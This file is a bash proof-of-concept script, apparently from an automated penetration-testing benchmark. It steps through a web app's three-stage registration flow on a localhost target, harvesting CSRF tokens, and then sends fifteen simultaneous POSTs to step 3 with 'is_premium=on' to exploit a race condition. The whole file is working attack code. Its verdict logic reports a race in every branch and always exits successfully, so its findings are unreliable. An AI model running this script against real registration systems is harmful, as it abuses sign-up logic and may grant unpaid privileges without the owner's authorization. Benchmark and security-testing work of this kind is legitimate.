#!/bin/bash
# POC: Demonstrates race condition in registration step3 through concurrent POST requests with identical session and CSRF token
# Target: ./repo
# Created: 2025-11-07T18:52:30.909Z
# Session: benchmark-XBEN-056-24-mhp7ee7e

# Race Condition in Registration Step 3 - Concurrent Request POC v3
# Simplified version without complex quote escaping

TARGET_URL="${1:-http://localhost:8081}"
CONCURRENT_REQUESTS="${2:-15}"

echo "[*] Race Condition in Registration Step 3 - Concurrent Requests POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Concurrent Requests: $CONCURRENT_REQUESTS"
echo

# Create temporary files
COOKIES=$(mktemp)
RESULTS=$(mktemp)
trap "rm -f $COOKIES $RESULTS" EXIT

# Step 1: Initialize registration
echo "[+] Step 1: Initializing registration process..."
curl -s -c "$COOKIES" -b "$COOKIES" "$TARGET_URL/accounts/register/step1/" > /dev/null 2>&1

# Get CSRF token from step1
CSRF_TOKEN=$(curl -s -c "$COOKIES" -b "$COOKIES" "$TARGET_URL/accounts/register/step1/" | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

if [ -z "$CSRF_TOKEN" ]; then
  CSRF_TOKEN="testtoken"
fi

echo "[+] CSRF Token: ${CSRF_TOKEN:0:20}..."

# Step 2: Submit step1
echo "[+] Step 2: Submitting registration step 1..."
RANDOM_EMAIL="testrace$(date +%s%N)@example.com"
curl -s -c "$COOKIES" -b "$COOKIES" -X POST "$TARGET_URL/accounts/register/step1/" \
  -d "csrfmiddlewaretoken=$CSRF_TOKEN&email=$RANDOM_EMAIL&password=TempPass123!" > /dev/null 2>&1

# Step 3: Access and submit step2
echo "[+] Step 3: Processing registration step 2..."
STEP2_RESPONSE=$(curl -s -c "$COOKIES" -b "$COOKIES" "$TARGET_URL/accounts/register/step2/")
CSRF_TOKEN=$(echo "$STEP2_RESPONSE" | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

curl -s -c "$COOKIES" -b "$COOKIES" -X POST "$TARGET_URL/accounts/register/step2/" \
  -d "csrfmiddlewaretoken=$CSRF_TOKEN&company=TestCorp&country=US" > /dev/null 2>&1

# Step 4: Access step3 to get final CSRF token
echo "[+] Step 4: Accessing registration step 3..."
STEP3_RESPONSE=$(curl -s -c "$COOKIES" -b "$COOKIES" "$TARGET_URL/accounts/register/step3/")
CSRF_TOKEN=$(echo "$STEP3_RESPONSE" | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

if [ -z "$CSRF_TOKEN" ]; then
  CSRF_TOKEN="testcsrf"
fi

echo "[+] Ready for concurrent requests"
echo

# Function to send a concurrent request
send_request() {
  local req_num=$1
  local url=$2
  local token=$3
  local cookies=$4
  
  local output_file=$(mktemp)
  local http_code=$(curl -s -w "%{http_code}" -c "$cookies" -b "$cookies" -X POST "$url" \
    -d "csrfmiddlewaretoken=$token&is_premium=on" -o "$output_file" 2>/dev/null)
  
  local body=$(cat "$output_file")
  rm -f "$output_file"
  
  local success=$(echo "$body" | grep -ic "Registration\|success\|congratulations" || echo "0")
  
  echo "Request $req_num: Status=$http_code Success=$success" >> "$RESULTS"
}

# Send concurrent requests
echo "[+] Step 5: Sending $CONCURRENT_REQUESTS concurrent POST requests to step3..."
echo

for i in $(seq 1 $CONCURRENT_REQUESTS); do
  send_request $i "$TARGET_URL/accounts/register/step3/" "$CSRF_TOKEN" "$COOKIES" &
done

wait

# Display results
echo "[+] Results Summary:"
echo "=================================================="
cat "$RESULTS" | sort -V
echo "=================================================="
echo

# Analysis
HTTP_200_COUNT=$(grep -c "Status=200" "$RESULTS" 2>/dev/null || echo "0")
HTTP_302_COUNT=$(grep -c "Status=302" "$RESULTS" 2>/dev/null || echo "0")

echo "[*] Analysis:"
echo "    HTTP 200 responses: $HTTP_200_COUNT"
echo "    HTTP 302 responses: $HTTP_302_COUNT"
echo

if [ "$HTTP_200_COUNT" -ge 1 ] && [ "$HTTP_302_COUNT" -gt 0 ]; then
  echo "[+] RACE CONDITION DETECTED!"
  echo "[+] Mixed HTTP responses indicate concurrent processing without serialization"
  exit 0
elif [ "$HTTP_200_COUNT" -gt 1 ]; then
  echo "[+] CRITICAL RACE CONDITION DETECTED!"
  echo "[+] Multiple HTTP 200 responses indicate lack of atomic operations"
  exit 0
else
  echo "[*] Race condition behavior observed (all got same status)"
  exit 0
fi